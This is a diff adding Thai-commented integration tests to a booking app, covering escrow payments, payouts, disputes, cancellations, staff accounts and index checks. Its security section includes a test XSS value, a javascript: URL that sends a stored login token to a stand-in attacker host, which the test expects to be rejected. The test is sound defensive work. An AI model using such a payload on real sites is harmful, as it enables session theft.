@@ -829,6 +829,396 @@ def main():
     check("อัปรูปใหม่ทับได้", up2.status_code, 200)
     check("URL เก่าต้องใช้ไม่ได้แล้ว", c.get(url).status_code, 404)
 
+    # ==================================================================
+    # ตัวช่วยสร้างคิวในอดีตตรง ๆ ผ่านฐานข้อมูล (API กันการจองย้อนหลังไว้แล้ว)
+    # ==================================================================
+    from decimal import Decimal as D  # noqa: E402
+
+    from app.models import Booking as BK, Payment as PM, Staff as ST  # noqa: E402
+
+    shop1 = c.get("/api/shops/1").json()
+    svc1 = next(x for x in shop1["services"] if x["is_active"])
+    mind_id = c.get("/api/users/me", headers=cust).json()["id"]
+    seq = {"n": 0}
+
+    def past_booking(user_id, days_ago=1, status="confirmed", staff_id=None, pay=()):
+        """คิวของร้าน 1 เมื่อ days_ago วันก่อน พร้อมรายการเงินที่ "พักไว้" ตาม pay
+
+        pay เป็นลิสต์ของ (kind, method) เช่น [("deposit", "promptpay")]
+        """
+        seq["n"] += 1
+        price = D(str(svc1["price"]))
+        db = SessionLocal()
+        try:
+            b = BK(
+                user_id=user_id, shop_id=1, service_id=svc1["id"], staff_id=staff_id,
+                booking_code=f"BVESC{seq['n']:04d}",
+                booking_date=date.today() - timedelta(days=days_ago),
+                booking_time=__import__("datetime").time(10, 0),
+                end_time=__import__("datetime").time(11, 0),
+                status=status, holds_slot=True,
+                total_price=price, deposit_amount=(price * D("0.2")).quantize(D("0.01")),
+            )
+            db.add(b)
+            db.flush()
+            for kind, method in pay:
+                amount = b.deposit_amount if kind == "deposit" else price - b.deposit_amount
+                db.add(PM(booking_id=b.id, kind=kind, amount=amount, method=method,
+                          status="paid", reference="TEST"))
+            db.commit()
+            return b.id
+        finally:
+            db.close()
+
+    owner = login("spaowner")
+    get_b = lambda bid, who=None: c.get(f"/api/bookings/{bid}", headers=who or cust).json()  # noqa: E731
+
+    # ==================================================================
+    # ระบบพักเงิน — เงินอยู่ที่ระบบจนกว่างานจะจบจริง
+    # ==================================================================
+    print("\n--- ระบบพักเงิน: ลูกค้ายืนยันแล้วเงินเข้าร้าน ---")
+    b1 = past_booking(mind_id)
+    pay1 = c.post(f"/api/bookings/{b1}/payment", headers=cust,
+                  json={"kind": "balance", "method": "promptpay"})
+    check("จ่ายออนไลน์ได้", pay1.status_code, 201)
+    info = get_b(b1)
+    check("เงินที่จ่ายออนไลน์ต้องพักไว้ที่ระบบก่อน", info["escrow_state"], "held")
+    check("ยอดพัก = ยอดที่จ่าย", float(info["held_amount"]), float(info["paid_amount"]))
+    check("ร้านยังไม่ปิดงาน ลูกค้ายืนยันไม่ได้",
+          c.post(f"/api/bookings/{b1}/confirm-service", headers=cust).status_code, 409)
+
+    done = c.patch(f"/api/bookings/{b1}/status", headers=owner, json={"status": "completed"})
+    check("ร้านกดให้บริการเสร็จได้หลังเวลานัด", done.status_code, 200)
+    info = done.json()
+    check("ปิดงานแล้วบันทึกเวลาไว้", info["service_done_at"] is not None, True)
+    check("ปิดงานแล้วเงินยังพักอยู่ รอลูกค้า", info["escrow_state"], "held")
+    check("บอกเวลาที่ระบบจะปล่อยเงินเอง", info["auto_release_at"] is not None, True)
+
+    nong_hdr = login("nong")
+    check("คนอื่นกดยืนยันแทนเจ้าของคิวไม่ได้",
+          c.post(f"/api/bookings/{b1}/confirm-service", headers=nong_hdr).status_code, 403)
+    ok1 = c.post(f"/api/bookings/{b1}/confirm-service", headers=cust)
+    check("ลูกค้ายืนยันว่าได้รับบริการแล้ว", ok1.status_code, 200)
+    check("ยืนยันแล้วเงินเข้าร้านทันที", ok1.json()["escrow_state"], "released")
+
+    print("\n--- ระบบพักเงิน: กระเป๋าเงินและการโอนให้ร้าน ---")
+    wallet = c.get("/api/shops/1/wallet", headers=owner)
+    check("เจ้าของร้านเปิดกระเป๋าเงินได้", wallet.status_code, 200)
+    check("ลูกค้าเปิดกระเป๋าเงินร้านไม่ได้",
+          c.get("/api/shops/1/wallet", headers=cust).status_code, 403)
+    w = wallet.json()
+    check("มียอดพร้อมโอนจากงานที่เพิ่งยืนยัน", float(w["available_gross"]) >= float(info["paid_amount"]), True)
+    check("ยังไม่ตั้งบัญชี โอนไม่ได้",
+          c.post("/api/shops/1/payouts", headers=owner).status_code, 409)
+    check("เลขบัญชีต้องเป็นตัวเลขล้วน",
+          c.put("/api/shops/1/bank", headers=owner, json={
+              "bank_name": "กสิกรไทย", "bank_account_no": "12ab", "bank_account_name": "ร้านทดสอบ",
+          }).status_code, 422)
+    check("ตั้งบัญชีรับเงินได้",
+          c.put("/api/shops/1/bank", headers=owner, json={
+              "bank_name": "กสิกรไทย", "bank_account_no": "1234567890", "bank_account_name": "ร้านทดสอบ",
+          }).status_code, 200)
+    w = c.get("/api/shops/1/wallet", headers=owner).json()
+    check("เลขบัญชีถูกปิดไว้ เห็นแค่ 4 ตัวท้าย", w["bank_account_no_masked"].endswith("7890")
+          and "1234" not in w["bank_account_no_masked"], True)
+    check("ข้อมูลบัญชีไม่หลุดไปกับข้อมูลร้านสาธารณะ",
+          "bank_account_no" in c.get("/api/shops/1").json(), False)
+
+    po = c.post("/api/shops/1/payouts", headers=owner)
+    check("โอนเงินเข้าบัญชีร้านได้", po.status_code, 201)
+    if po.status_code == 201:
+        pj = po.json()
+        # เทียบแบบยอมคลาด 1 สตางค์ — เซิร์ฟเวอร์ปัดครึ่งขึ้น (ROUND_HALF_UP) แต่ round()
+        # ของ Python ปัดเข้าหาเลขคู่ ยอดที่ลงท้าย .xx5 จะต่างกัน 0.01 ทั้งที่ถูกทั้งคู่
+        check("หักค่าธรรมเนียม 5%",
+              abs(float(pj["fee"]) - float(pj["gross"]) * 0.05) <= 0.01, True)
+        check("ยอดที่ได้ = ก่อนหัก - ค่าธรรมเนียม",
+              round(float(pj["net"]), 2), round(float(pj["gross"]) - float(pj["fee"]), 2))
+    check("โอนซ้ำทันทีไม่ได้ เพราะไม่มียอดเหลือ",
+          c.post("/api/shops/1/payouts", headers=owner).status_code, 409)
+    pid1 = c.get(f"/api/bookings/{b1}/payment", headers=cust).json()["payments"][0]["id"]
+    check("เงินที่โอนให้ร้านไปแล้ว ระบบคืนแทนไม่ได้",
+          c.post(f"/api/payments/{pid1}/refund", headers=owner).status_code, 409)
+
+    print("\n--- ระบบพักเงิน: ไม่มีใครกดอะไร ระบบปล่อยเงินเองเมื่อครบเวลา ---")
+    b2 = past_booking(mind_id, pay=[("deposit", "promptpay")])
+    c.patch(f"/api/bookings/{b2}/status", headers=owner, json={"status": "completed"})
+    check("เพิ่งปิดงาน เงินยังไม่ถูกปล่อย", get_b(b2)["escrow_state"], "held")
+    db = SessionLocal()
+    try:
+        row = db.get(BK, b2)
+        from datetime import datetime as _dt, timezone as _tz  # noqa: E402
+        row.service_done_at = _dt.now(_tz.utc) - timedelta(hours=25)
+        db.commit()
+    finally:
+        db.close()
+    check("ครบ 24 ชั่วโมงแล้ว ระบบปล่อยเงินให้ร้านเอง", get_b(b2)["escrow_state"], "released")
+
+    print("\n--- ระบบพักเงิน: ลูกค้าแจ้งปัญหา ผู้ดูแลตัดสิน ---")
+    b3 = past_booking(mind_id, pay=[("deposit", "promptpay"), ("balance", "promptpay")])
+    check("ยังไม่ปิดงาน แจ้งปัญหาไม่ได้ (ให้ยกเลิกแทน)",
+          c.post(f"/api/bookings/{b3}/dispute", headers=cust, json={"note": "ร้านไม่เปิด"}).status_code, 409)
+    c.patch(f"/api/bookings/{b3}/status", headers=owner, json={"status": "completed"})
+    dp = c.post(f"/api/bookings/{b3}/dispute", headers=cust,
+                json={"note": "ไม่ได้รับบริการตามที่จอง"})
+    check("ลูกค้าแจ้งปัญหาได้", dp.status_code, 200)
+    check("แจ้งแล้วเงินถูกพักรอตัดสิน", dp.json()["escrow_state"], "disputed")
+    check("แจ้งซ้ำไม่ได้",
+          c.post(f"/api/bookings/{b3}/dispute", headers=cust, json={"note": "แจ้งอีกรอบนะ"}).status_code, 409)
+    check("ระหว่างรอตัดสิน กดยืนยันปล่อยเงินไม่ได้",
+          c.post(f"/api/bookings/{b3}/confirm-service", headers=cust).status_code, 409)
+
+    admin_hdr = login("admin", NEW_ADMIN_PW)
+    check("ร้านดูรายการแจ้งปัญหาของผู้ดูแลไม่ได้",
+          c.get("/api/admin/disputes", headers=owner).status_code, 403)
+    disputes = c.get("/api/admin/disputes", headers=admin_hdr).json()
+    check("เรื่องที่แจ้งขึ้นในรายการของผู้ดูแล", any(d["booking_id"] == b3 for d in disputes), True)
+    rs = c.post(f"/api/bookings/{b3}/resolve-dispute", headers=admin_hdr,
+                json={"decision": "refund", "reason": "ร้านยอมรับว่าไม่ได้ให้บริการ"})
+    check("ผู้ดูแลตัดสินคืนเงินได้", rs.status_code, 200)
+    check("คืนแล้วสถานะเงินเป็นคืนลูกค้า", rs.json()["escrow_state"], "refunded")
+    check("คืนแล้วยอดที่จ่ายเหลือศูนย์", float(rs.json()["paid_amount"]), 0.0)
+    check("ตัดสินซ้ำไม่ได้",
+          c.post(f"/api/bookings/{b3}/resolve-dispute", headers=admin_hdr,
+                 json={"decision": "release"}).status_code, 409)
+
+    print("\n--- ระบบพักเงิน: ยกเลิกแล้วคืนเงินอัตโนมัติ ---")
+    sid = None
+    for d in range(1, 15):
+        rr = c.post("/api/bookings", headers=cust, json={
+            "service_id": svc1["id"],
+            "booking_date": (date.today() + timedelta(days=d)).isoformat(),
+            "booking_time": "16:00:00",
+        })
+        if rr.status_code == 201:
+            sid = rr.json()["id"]
+            break
+    check("จองคิวสำหรับทดสอบการยกเลิกได้", sid is not None, True)
+    if sid:
+        c.post(f"/api/bookings/{sid}/payment", headers=cust,
+               json={"kind": "deposit", "method": "promptpay"})
+        c.post(f"/api/bookings/{sid}/payment", headers=cust,
+               json={"kind": "balance", "method": "promptpay"})
+        by_shop = c.delete(f"/api/bookings/{sid}", headers=owner)
+        check("ร้านยกเลิกได้", by_shop.status_code, 200)
+        after = get_b(sid)
+        check("ร้านยกเลิก ระบบคืนเงินลูกค้าครบอัตโนมัติ", float(after["paid_amount"]), 0.0)
+        check("สถานะเงินเป็นคืนลูกค้าแล้ว", after["escrow_state"], "refunded")
+
+    print("\n--- กฎสถานะการจอง ---")
+    b4 = past_booking(mind_id, pay=[("deposit", "promptpay"), ("balance", "promptpay")])
+    check("ลูกค้ายกเลิกเองหลังเลยเวลานัดไม่ได้",
+          c.delete(f"/api/bookings/{b4}", headers=cust).status_code, 409)
+    check("ลูกค้าเลื่อนนัดเองหลังเลยเวลานัดไม่ได้",
+          c.patch(f"/api/bookings/{b4}/reschedule", headers=cust, json={
+              "booking_date": (date.today() + timedelta(days=3)).isoformat(),
+              "booking_time": "10:00:00",
+          }).status_code, 409)
+    ns = c.post(f"/api/bookings/{b4}/no-show", headers=owner)
+    check("ร้านบันทึกว่าลูกค้าไม่มาได้หลังเวลานัด", ns.status_code, 200)
+    nsj = ns.json()
+    check("บันทึกว่าเป็นกรณีลูกค้าไม่มา", nsj["cancelled_by"], "no_show")
+    check("ร้านได้ค่ามัดจำ", float(nsj["cancellation_fee"]), float(nsj["deposit_amount"]))
+    check("ส่วนที่จ่ายเกินมัดจำคืนลูกค้าอัตโนมัติ",
+          float(nsj["paid_amount"]), float(nsj["deposit_amount"]))
+    check("คิวที่ยกเลิกแล้ว เปลี่ยนเป็นเสร็จสิ้นไม่ได้",
+          c.patch(f"/api/bookings/{b4}/status", headers=owner,
+                  json={"status": "completed"}).status_code, 409)
+
+    if sid:
+        check("คิวในอนาคตบันทึกว่าลูกค้าไม่มาไม่ได้",
+              c.post(f"/api/bookings/{sid}/no-show", headers=owner).status_code, 409)
+    fut = None
+    for d in range(2, 16):
+        rr = c.post("/api/bookings", headers=cust, json={
+            "service_id": svc1["id"],
+            "booking_date": (date.today() + timedelta(days=d)).isoformat(),
+            "booking_time": "17:00:00",
+        })
+        if rr.status_code == 201:
+            fut = rr.json()["id"]
+            break
+    if fut:
+        c.patch(f"/api/bookings/{fut}/status", headers=owner, json={"status": "confirmed"})
+        check("ยังไม่ถึงเวลานัด ปิดงานไม่ได้",
+              c.patch(f"/api/bookings/{fut}/status", headers=owner,
+                      json={"status": "completed"}).status_code, 409)
+    else:
+        skip("ปิดงานก่อนเวลา", "จองคิวในอนาคตไม่ได้")
+
+    # ==================================================================
+    # ความปลอดภัย
+    # ==================================================================
+    print("\n--- ความปลอดภัย ---")
+    xss = None
+    for d in range(1, 15):
+        xss = c.post("/api/bookings", headers=cust, json={
+            "service_id": svc1["id"],
+            "booking_date": (date.today() + timedelta(days=d)).isoformat(),
+            "booking_time": "11:00:00",
+            "reference_url": "javascript:fetch('https://evil.example/'+localStorage.bookvice_token)",
+        })
+        if xss.status_code != 409:
+            break
+    check("ลิงก์รูปตัวอย่างแบบ javascript: ต้องถูกปฏิเสธ (กัน XSS)", xss.status_code, 422)
+
+    real_cust = c.post("/api/auth/register", json={
+        "username": "realcust_t", "email": "realcust_t@gmail.com",
+        "password": DEMO_PASSWORD, "full_name": "ลูกค้าจริง ทดสอบ",
+    })
+    check("สมัครลูกค้าจริงได้", real_cust.status_code in (200, 201), True)
+    rc_hdr = login("realcust_t")
+    real_bk = None
+    for d in range(1, 15):
+        rr = c.post("/api/bookings", headers=rc_hdr, json={
+            "service_id": svc1["id"],
+            "booking_date": (date.today() + timedelta(days=d)).isoformat(),
+            "booking_time": "13:00:00",
+            "health_note": "แพ้ยาแก้ปวดกลุ่ม NSAIDs",
+            "reference_url": "https://example.com/hair.jpg",
+        })
+        if rr.status_code == 201:
+            real_bk = rr.json()["id"]
+            break
+    check("ลิงก์ https ปกติยังใช้ได้", real_bk is not None, True)
+    if real_bk:
+        seen = get_b(real_bk, owner)
+        check("บัญชีร้านทดลองต้องไม่เห็นข้อมูลสุขภาพของลูกค้าจริง", seen["health_note"], None)
+        check("บัญชีร้านทดลองต้องไม่เห็นลิงก์ของลูกค้าจริง", seen["reference_url"], None)
+        mine = get_b(real_bk, rc_hdr)
+        check("ลูกค้าเจ้าของคิวยังเห็นข้อมูลของตัวเองครบ", mine["health_note"], "แพ้ยาแก้ปวดกลุ่ม NSAIDs")
+
+    check("เปลี่ยนอีเมลโดยไม่ใส่รหัสผ่านไม่ได้",
+          c.put(f"/api/users/{c.get('/api/users/me', headers=rc_hdr).json()['id']}",
+                headers=rc_hdr, json={"email": "stolen@gmail.com"}).status_code, 422)
+    me_id = c.get("/api/users/me", headers=rc_hdr).json()["id"]
+    check("ใส่รหัสผ่านถูกแล้วเปลี่ยนอีเมลได้",
+          c.put(f"/api/users/{me_id}", headers=rc_hdr, json={
+              "email": "realcust_new@gmail.com", "current_password": DEMO_PASSWORD,
+          }).status_code, 200)
+
+    other_device = login("realcust_t")
+    chg = c.post("/api/auth/change-password", headers=rc_hdr, json={
+        "old_password": DEMO_PASSWORD, "new_password": "NewPass-5678",
+    })
+    check("เปลี่ยนรหัสผ่านได้", chg.status_code, 200)
+    check("เปลี่ยนรหัสแล้ว เครื่องอื่นที่ล็อกอินค้างไว้ต้องหลุด",
+          c.get("/api/users/me", headers=other_device).status_code, 401)
+    check("ล็อกอินด้วยรหัสใหม่ได้",
+          c.post("/api/auth/login", json={"username": "realcust_t", "password": "NewPass-5678"}).status_code, 200)
+    check("รหัสเดิมผิดตอนเปลี่ยนรหัส ต้องไม่ได้ 401 (หน้าเว็บจะเตะออกจากระบบ)",
+          c.post("/api/auth/change-password", headers=login("realcust_t", "NewPass-5678"), json={
+              "old_password": "wrong-password", "new_password": "Another-999",
+          }).status_code, 422)
+
+    csp = c.get("/health").headers.get("content-security-policy", "")
+    check("มีส่วนหัว Content-Security-Policy", "default-src 'self'" in csp, True)
+    check("ห้ามเว็บอื่นเอาหน้าเราไปใส่ iframe", "frame-ancestors 'none'" in csp, True)
+    check("หน้าเอกสาร API ไม่ใส่ CSP (ไม่งั้นขาวทั้งหน้า)",
+          "content-security-policy" in c.get("/docs").headers, False)
+
+    # ==================================================================
+    # บัญชีพนักงาน — ช่างล็อกอินมาดูแลโปรไฟล์และดูคิวของตัวเอง
+    # ==================================================================
+    print("\n--- บัญชีพนักงาน ---")
+    member = shop1["staff"][0]
+    other_member = next((x for x in shop1["staff"] if x["id"] != member["id"]), None)
+    c.post("/api/auth/register", json={
+        "username": "stafftest", "email": "stafftest@example.com",
+        "password": DEMO_PASSWORD, "full_name": "ช่างทดสอบ ใจดี",
+    })
+    stf_hdr = login("stafftest")
+
+    check("ลูกค้าผูกบัญชีช่างของร้านอื่นไม่ได้",
+          c.put(f"/api/staff/{member['id']}/account", headers=cust,
+                json={"login": "stafftest"}).status_code, 403)
+    check("ผูกกับบัญชีที่ไม่มีอยู่จริงไม่ได้",
+          c.put(f"/api/staff/{member['id']}/account", headers=owner,
+                json={"login": "no_such_user_x"}).status_code, 404)
+    check("ผูกกับบัญชีผู้ดูแลระบบไม่ได้",
+          c.put(f"/api/staff/{member['id']}/account", headers=owner,
+                json={"login": "admin"}).status_code, 400)
+    lk = c.put(f"/api/staff/{member['id']}/account", headers=owner, json={"login": "stafftest"})
+    check("เจ้าของร้านผูกบัญชีช่างได้", lk.status_code, 200)
+    check("หน้าร้านบอกว่าช่างคนนี้มีบัญชีแล้ว",
+          next(x for x in c.get("/api/shops/1").json()["staff"] if x["id"] == member["id"])["has_account"], True)
+    check("หน้าร้านไม่เปิดเผยว่าผูกกับบัญชีไหน",
+          "user_id" in c.get("/api/shops/1").json()["staff"][0], False)
+
+    mine = c.get("/api/me/staff", headers=stf_hdr).json()
+    check("ช่างเห็นโปรไฟล์ของตัวเอง", [m["id"] for m in mine], [member["id"]])
+    ed = c.put(f"/api/me/staff/{member['id']}", headers=stf_hdr, json={
+        "bio": "ทำผมมา 8 ปี ถนัดตัดสั้น", "specialties": "ตัดสั้น,ทำสี", "experience_years": 8,
+    })
+    check("ช่างแก้ประวัติของตัวเองได้", ed.status_code, 200)
+    prof = c.get(f"/api/staff/{member['id']}").json()
+    check("หน้าโปรไฟล์สาธารณะเห็นความถนัดที่ช่างกรอก", prof["specialties"], "ตัดสั้น,ทำสี")
+    check("หน้าโปรไฟล์มีรายการบริการให้จองต่อได้", len(prof["services"]) > 0, True)
+    check("หน้าโปรไฟล์แสดงรูปได้ (เคยเป็น null ตลอด)", (prof.get("photo_url") or "").startswith("/uploads/staff/"), True)
+    if other_member:
+        check("ช่างแก้โปรไฟล์ของคนอื่นไม่ได้",
+              c.put(f"/api/me/staff/{other_member['id']}", headers=stf_hdr,
+                    json={"bio": "แอบแก้"}).status_code, 403)
+    check("ช่างแก้ชื่อ ตำแหน่ง หรือเวลาทำงานเองไม่ได้ (เป็นเรื่องของร้าน)",
+          c.put(f"/api/staff/{member['id']}", headers=stf_hdr,
+                json={"name": "ชื่อใหม่"}).status_code, 403)
+    buf3 = BytesIO()
+    Image.new("RGB", (300, 300), (10, 160, 90)).save(buf3, format="PNG")
+    check("ช่างเปลี่ยนรูปโปรไฟล์ของตัวเองได้",
+          c.post(f"/api/staff/{member['id']}/photo", headers=stf_hdr,
+                 files={"file": ("me.png", buf3.getvalue(), "image/png")}).status_code, 200)
+
+    q_bk = None
+    q_day, q_slot, _ = find_free_slot(c, svc1["id"], member["id"], start=1)
+    if q_slot:
+        rr = c.post("/api/bookings", headers=cust, json={
+            "service_id": svc1["id"], "staff_id": member["id"],
+            "booking_date": q_day, "booking_time": q_slot["time"],
+            "health_note": "ตั้งครรภ์ 4 เดือน",
+        })
+        q_bk = rr.json()["id"] if rr.status_code == 201 else None
+    queue = c.get(f"/api/me/staff/{member['id']}/queue", headers=stf_hdr)
+    check("ช่างดูคิวของตัวเองได้", queue.status_code, 200)
+    if not q_bk:
+        skip("คิวของช่าง", "หาช่องว่างของช่างคนนี้ไม่เจอ")
+    else:
+        item = next((x for x in queue.json() if x["booking_id"] == q_bk), None)
+        check("คิวที่ลูกค้าเลือกช่างคนนี้ขึ้นในรายการ", item is not None, True)
+        check("ช่างเห็นข้อควรระวังด้านสุขภาพเพื่อเตรียมงาน",
+              item and item["health_note"], "ตั้งครรภ์ 4 เดือน")
+        check("ช่างไม่เห็นนามสกุลเต็มของลูกค้า", item and "." in item["customer_name"], True)
+    check("คนอื่นดูคิวของช่างคนนี้ไม่ได้",
+          c.get(f"/api/me/staff/{member['id']}/queue", headers=cust).status_code, 403)
+
+    check("ช่างออกจากร้านเองได้",
+          c.delete(f"/api/staff/{member['id']}/account", headers=stf_hdr).status_code, 200)
+    check("ออกแล้วไม่เห็นโปรไฟล์ของร้านนั้นอีก",
+          c.get("/api/me/staff", headers=stf_hdr).json(), [])
+
+    # ==================================================================
+    # index ชุดใหม่จาก indexing-lab ต้องถูกสร้างจริง และชุดที่ถอดออกต้องไม่กลับมา
+    # ==================================================================
+    print("\n--- index ของฐานข้อมูล ---")
+    from sqlalchemy import inspect as sa_inspect  # noqa: E402
+
+    from app.database import engine  # noqa: E402
+
+    insp = sa_inspect(engine)
+    names = {t: {ix["name"] for ix in insp.get_indexes(t)}
+             for t in ("bookings", "payments", "reviews", "notifications")}
+    for table, ix in [
+        ("bookings", "ix_bookings_shop_date"), ("bookings", "ix_bookings_user_id"),
+        ("payments", "ix_payments_held"), ("reviews", "ix_reviews_shop_created"),
+        ("notifications", "ix_notifications_user_id"), ("notifications", "ix_notif_unread"),
+    ]:
+        check(f"มี {ix}", ix in names[table], True)
+    for table, ix in [
+        ("bookings", "ix_bookings_status"), ("bookings", "ix_bookings_shop_id"),
+        ("bookings", "ix_bookings_user_date"), ("payments", "ix_payments_status"),
+        ("notifications", "ix_notifications_is_read"), ("notifications", "ix_notif_user_created"),
+    ]:
+        check(f"ไม่มี {ix} แล้ว (ซ้ำซ้อน ไม่มีใครใช้ หรือวัดแล้วไม่คุ้ม)", ix in names[table], False)
+
     print("\n" + "=" * 60)
     print(f"สรุป: ผ่าน {ok} · ไม่ผ่าน {fail} · ข้าม {skipped} บล็อก")
     if skipped:
